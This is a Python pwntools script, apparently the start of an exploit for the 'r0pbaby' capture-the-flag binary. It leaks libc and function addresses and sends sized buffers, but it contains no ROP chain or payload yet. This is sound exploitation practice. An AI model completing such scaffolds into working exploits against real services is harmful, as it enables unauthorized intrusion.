#!/usr/bin/env python
from pwn import *
import sys
import time
from IPython import embed
from IPython.terminal.embed import InteractiveShellEmbed

ipshell = InteractiveShellEmbed()

context.log_level = 'debug'


class C:
    def __init__(self, conn):
        self.conn = conn
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendafter      = conn.sendafter
        self.funcs = {}

    def get_libc_addr(self):
        self.sendafter(': ', '1\n')
        self.libc_addr = self.recvuntil('\n').split(' ')[1]

    def get_func_addr(self, func):
        self.sendafter(': ', '2')
        self.sendafter(': ', func)
        addr = self.recvuntil('\n').split(': ')[1]
        self.funcs[func] = addr

    def send_buf(self, size, data):
        self.sendafter(': ', str(size))
        self.sendline(data)


def main():
    if len(sys.argv) == 2 and sys.argv[1] == 'r':
        print("remote...")
        conn = remote('', 10001)
    else:
        print("local...")
        conn = process('./r0pbaby')
    c = C(conn)
    c.get_libc_addr()
    c.get_libc_addr()

if __name__=='__main__':
    main()
